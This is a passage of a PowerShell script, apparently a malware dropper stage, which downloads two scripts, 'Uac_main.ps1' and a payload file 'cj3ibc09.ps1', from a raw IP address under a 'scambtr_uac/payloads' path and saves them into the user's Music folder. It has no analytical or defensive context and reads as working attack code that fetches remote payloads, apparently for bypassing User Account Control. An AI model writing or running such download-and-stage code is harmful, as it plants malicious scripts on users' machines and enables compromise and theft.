...
$url  = 'http://44.203.122.41:80/scambtr_uac/Uac_main.ps1'
$file = "c:\Users\$env:USERNAME\Music\Uac_main.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/scambtr_uac/payloads/cj3ibc09.ps1'
$file = "c:\Users\$env:USERNAME\Music\cj3ibc09.ps1"
$down.DownloadFile($url, $file);
